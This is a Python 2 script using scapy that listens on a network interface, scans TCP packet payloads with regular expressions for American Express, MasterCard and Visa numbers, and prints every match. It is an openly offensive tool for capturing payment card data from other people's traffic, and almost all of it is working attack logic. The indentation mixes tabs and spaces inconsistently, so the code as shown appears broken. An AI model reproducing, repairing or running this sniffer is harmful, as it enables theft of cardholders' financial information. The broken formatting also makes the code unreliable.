#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import optparse
from scapy.all import *


def findCreditCard(pkt):
    # Searches the packet for the raw load that is included in the
	# packet
	raw = pkt.sprintf('%Raw.load%')
    # Uses Regular Expressions to search for specific card vendors
	# Must start with 3, followed by 4/7, 13 more digits 0-9
	americaRE = re.findall('3[47][0-9]{13}', raw)
    # Must start with 5, followed by 1-5, 14 more digits 0-9
	masterRE = re.findall('5[1-5][0-9]{14}', raw)
    # Must start with 4, followed by either 12-15 more digits 0-9
	visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

	# Prints the card vendor and account number if a match is found
    if americaRE:
        print '[+] Found American Express Card: ' + americaRE[0]
    if masterRE:
        print '[+] Found MasterCard Card: ' + masterRE[0]
    if visaRE:
        print '[+] Found Visa Card: ' + visaRE[0]


def main():
    # Parse User Options
	parser = optparse.OptionParser('usage %prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string',\
      help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface

    try:
        print '[*] Starting Credit Card Sniffer.'
        # Uses  the scapy sniff function to sniff traffic, with tcp
		# and uses  the findCreditCard function to look for credit
		# card numbers
		sniff(filter='tcp', prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()
